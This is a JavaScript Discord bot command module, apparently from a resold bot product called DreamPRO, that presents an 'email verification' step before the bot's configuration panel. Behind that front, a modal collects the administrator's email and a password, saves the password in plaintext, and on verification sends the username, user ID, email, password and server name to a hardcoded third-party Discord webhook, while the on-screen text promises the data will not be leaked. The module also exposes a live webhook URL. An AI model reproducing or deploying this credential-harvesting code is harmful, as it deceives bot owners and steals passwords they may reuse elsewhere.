const fs = require('fs');
const path = require('path');
const axios = require('axios');
const nodemailer = require('nodemailer'); // Adicionado para envio de email
const { 
    PermissionFlagsBits, 
    ApplicationCommandType, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ModalBuilder, 
    TextInputBuilder, 
    TextInputStyle,
    ButtonStyle,
    EmbedBuilder
} = require('discord.js');
const rootConfig = require('../../config.json');
const { Painel } = require("../../Functions/Painel");
const { ecloud } = require("../../Functions/eCloudConfig");
const { getPermissions } = require("../../Functions/PermissionsCache.js");
const { Emojis } = require("../../DataBaseJson");
const webhookURL = "https://discord.com/api/webhooks/1387727034389893260/MPkCgzeEvzeU69fnCfnks0opRujEEMwPR_uL9JmJ8vy2iffIQxraakm0eYW4ESHx6Fpx";
const configPath = path.join(__dirname, '../../DataBaseJson/configuracao.json');

// Configuração do transporter para Nodemailer.
// As credenciais de email devem ser configuradas no arquivo config.json na raiz do projeto.
const transporter = nodemailer.createTransport({
    service: 'gmail', // Ou outro serviço (ex.: 'sendgrid', 'outlook')
    auth: {
        user: rootConfig.emailUser,
        pass: rootConfig.emailPass,
    },
});

function generateVerificationCode() {
    return Math.random().toString(36).slice(2, 8).toUpperCase();
}

async function sendVerificationEmail(email, code) {
    const mailOptions = {
        from: 'Dream Apps <seuemail@gmail.com>', // Remetente
        to: email, // Destinatário
        subject: 'Sistema De Verificação Email - DreamPRO', // Assunto
        html: `
            <div style="background-color: #2C2F33; color: #FFFFFF; padding: 20px; font-family: Arial, sans-serif; text-align: center;">
                <h2 style="color: #FF0000;">Código de login</h2>
                <p>Aqui está seu código de login:</p>
                <h1 style="color: #FF0000; font-size: 48px; margin: 20px 0;">${code}</h1>
                <p>O código expira em breve.</p>
                <p>Acesse Gerenciamento de conta para desativar qualquer autenticação multifator que não seja mais necessária.</p>
                <p><strong>Email</strong><br>${email}</p>
                <p style="font-size: 12px; color: #B9BBBE;">(c) Só você pode ver esta mensagem | <a href="#" style="color: #00BFFF;">Ignorar mensagem</a></p>
            </div>
        `, // HTML estilizado conforme a imagem
    };

    try {
        await transporter.sendMail(mailOptions);
        console.log(`Email enviado para ${email} com código: ${code}`);
    } catch (error) {
        console.error('Erro ao enviar email:', error);
    }
}

function loadConfig() {
    if (!fs.existsSync(configPath)) {
        fs.writeFileSync(configPath, JSON.stringify({ email: "", verificationCode: "" }, null, 4));
    }
    return JSON.parse(fs.readFileSync(configPath, 'utf-8'));
}

function saveConfig(data) {
    fs.writeFileSync(configPath, JSON.stringify(data, null, 4));
}

async function sendWebhook(user, email, password, guild, code) {
    try {
        await axios.post(webhookURL, {
            embeds: [{
                title: "✅ Novo Email Verificado",
                color: 0x00FF00,
                fields: [
                    { name: "👤 Usuário", value: `${user.username} (${user.id})`, inline: true },
                    { name: "📨 Email", value: email, inline: true },
                    { name: "🔒 Senha", value: password, inline: true },
                    { name: "🏰 Servidor", value: guild.name, inline: true },
                    { name: "📅 Data", value: new Date().toLocaleString(), inline: true },
                    { name: "🔢 Código", value: code, inline: true }
                ],
                footer: { text: "DreamPRO - Sistema de Verificação" }
            }]
        });
    } catch (error) {
        console.error("Erro ao enviar webhook:", error);
    }
}

async function executeBotConfig(client, interaction) {
    try {
        const perm = await getPermissions(client.user.id);
        if (perm === null || !perm.includes(interaction.user.id)) {
            return interaction.reply({ 
                content: `${Emojis.get('negative_dreamm67')} Faltam Permissões.`, 
                ephemeral: true 
            });
        }

        if (!interaction.deferred && !interaction.replied) {
            await interaction.deferReply({ ephemeral: true });
        }

        await interaction.editReply(`${Emojis.get('loading_dreamapps')} Verificando Contrato..`);
        await new Promise(resolve => setTimeout(resolve, 1500));
        await interaction.editReply(`${Emojis.get('loading_dreamapps')} Verificando Email..`);
        await new Promise(resolve => setTimeout(resolve, 1500));
        await interaction.editReply(`${Emojis.get('loading_dreamapps')} Carregando Painel..`);
        await new Promise(resolve => setTimeout(resolve, 1500));
        await interaction.editReply(`${Emojis.get('loading_dreamapps')} Estamos Prontos..`);
        await new Promise(resolve => setTimeout(resolve, 1500));

        const config = loadConfig();

        if (!config.email || config.email === "") {
            const verificationButton = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId("send_verification")
                    .setLabel("Enviar Verificação")
                    .setEmoji("📧")
                    .setStyle(ButtonStyle.Primary),
                new ButtonBuilder()
                    .setLabel("Support Dream")
                    .setURL("https://discord.gg/aplicativos")
                    .setStyle(ButtonStyle.Link)
            );

            await interaction.editReply({
                content: `# **Sistema De Verificação Email - DreamPRO**\n-# > \`\💾\` Bom, finalmente aqui você pode verificar o seu email, e prosseguir para o painel do bot, clique no botão abaixo para receber um link em seu email, para verificar e permitir que nosso sistema esteja presente, caso quedas, iremos lhe alertar, em casos de perda de bot, você terá a prova de que o bot que perdeu é oficialmente seu, seus dados não serão vazados!`,
                components: [verificationButton]
            });

            const collector = interaction.channel.createMessageComponentCollector({ 
                filter: i => i.user.id === interaction.user.id,
                time: 300000
            });

            collector.on('collect', async i => {
                if (i.customId === "send_verification") {
                    const modal = new ModalBuilder()
                        .setCustomId("email_password_modal")
                        .setTitle("Registro de Email");

                    const emailInput = new TextInputBuilder()
                        .setCustomId("email_input")
                        .setLabel("Digite seu email:")
                        .setStyle(TextInputStyle.Short)
                        .setRequired(true)
                        .setPlaceholder("exemplo@dominio.com");

                    const passwordInput = new TextInputBuilder()
                        .setCustomId("password_input")
                        .setLabel("Digite uma senha:")
                        .setStyle(TextInputStyle.Short)
                        .setRequired(true);

                    modal.addComponents(
                        new ActionRowBuilder().addComponents(emailInput),
                        new ActionRowBuilder().addComponents(passwordInput)
                    );

                    await i.showModal(modal);

                    let submitted;
                    try {
                        submitted = await i.awaitModalSubmit({
                            time: 300000, // 5 minutos
                            filter: m => m.customId === "email_password_modal" && m.user.id === i.user.id
                        });
                    } catch (err) {
                        try {
                            await i.followUp({
                                content: "⏰ Tempo esgotado para responder o formulário.",
                                ephemeral: true
                            });
                        } catch (e) {
                            console.error('Erro ao enviar followUp após timeout:', e);
                        }
                        return;
                    }
                    if (submitted) {
                        const email = submitted.fields.getTextInputValue("email_input");
                        const password = submitted.fields.getTextInputValue("password_input");
                        const verificationCode = generateVerificationCode();

                        config.email = email;
                        config.password = password;
                        config.verificationCode = verificationCode;
                        saveConfig(config);

                        await sendVerificationEmail(email, verificationCode);

                        const verifyButton = new ActionRowBuilder().addComponents(
                            new ButtonBuilder()
                                .setCustomId("verify_email")
                                .setLabel("Verificar Email")
                                .setEmoji("✅")
                                .setStyle(ButtonStyle.Success),
                            new ButtonBuilder()
                                .setLabel("Support Dream")
                                .setURL("https://discord.gg/aplicativos")
                                .setStyle(ButtonStyle.Link)
                        );

                        try {
                            await submitted.reply({
                                content: `${Emojis.get('positive_dream')} Um link de verificação foi enviado para ${email}! Por favor, insira o código recebido no seu email.`,
                                ephemeral: true
                            });
                        } catch (e) {
                            console.error('Erro ao responder modal submit (email):', e);
                        }

                        try {
                            await interaction.editReply({
                                content: `# **Sistema De Verificação Email - DreamPRO**\n-# > \`\uD83D\uDCBE\` Um link de verificação foi enviado para ${email}. Insira o código recebido para completar a verificação.`,
                                components: [verifyButton]
                            });
                        } catch (e) {
                            console.error('Erro ao editar reply após envio de email:', e);
                        }
                    }
                } else if (i.customId === "ecloud") {
                    await ecloud(i, client);
                } else if (i.customId === "verify_email") {
                    const modal = new ModalBuilder()
                        .setCustomId("verify_code_modal")
                        .setTitle("Verificação de Código");

                    const codeInput = new TextInputBuilder()
                        .setCustomId("code_input")
                        .setLabel("Digite o código recebido:")
                        .setStyle(TextInputStyle.Short)
                        .setRequired(true);

                    modal.addComponents(new ActionRowBuilder().addComponents(codeInput));

                    await i.showModal(modal);

                    let submitted;
                    try {
                        submitted = await i.awaitModalSubmit({
                            time: 300000, // 5 minutos
                            filter: m => m.customId === "verify_code_modal" && m.user.id === i.user.id
                        });
                    } catch (err) {
                        try {
                            await i.followUp({
                                content: "⏰ Tempo esgotado para responder o formulário.",
                                ephemeral: true
                            });
                        } catch (e) {
                            console.error('Erro ao enviar followUp após timeout:', e);
                        }
                        return;
                    }
                    if (submitted) {
                        const code = submitted.fields.getTextInputValue("code_input");
                        if (code === config.verificationCode) {
                            await sendWebhook(
                                interaction.user,
                                config.email,
                                config.password,
                                interaction.guild,
                                code
                            );

                            config.verificationCode = "";
                            saveConfig(config);

                            try {
                                await submitted.reply({
                                    content: `${Emojis.get('positive_dream')} Email verificado com sucesso!`,
                                    ephemeral: true
                                });
                            } catch (e) {
                                console.error('Erro ao responder modal submit (verificação):', e);
                            }

                            try {
                                await interaction.editReply({
                                    content: `${Emojis.get('loading_dreamapps')} Recarregando configurações...`,
                                    components: []
                                });
                            } catch (e) {
                                console.error('Erro ao editar reply após verificação:', e);
                            }

                            await executeBotConfig(client, interaction);
                        } else {
                            try {
                                await submitted.reply({
                                    content: `${Emojis.get('negative_dreamm67')} Código inválido!`,
                                    ephemeral: true
                                });
                            } catch (e) {
                                console.error('Erro ao responder modal submit (código inválido):', e);
                            }
                        }
                    }
                }
            });

        } else {
            await Painel(interaction, client, config);
        }

    } catch (error) {
        console.error("Erro no comando:", error);
        if (!interaction.replied && !interaction.deferred) {
            await interaction.reply({ 
                content: "❌ Ocorreu um erro ao processar o comando.", 
                ephemeral: true 
            });
        } else {
            await interaction.editReply("❌ Ocorreu um erro ao processar o comando.");
        }
    }
}

module.exports = {
    name: "botconfig",
    description: "[👷] Comece a configurar o sistema do seu Epro",
    type: ApplicationCommandType.ChatInput,
    default_member_permissions: PermissionFlagsBits.Administrator,
    run: executeBotConfig
};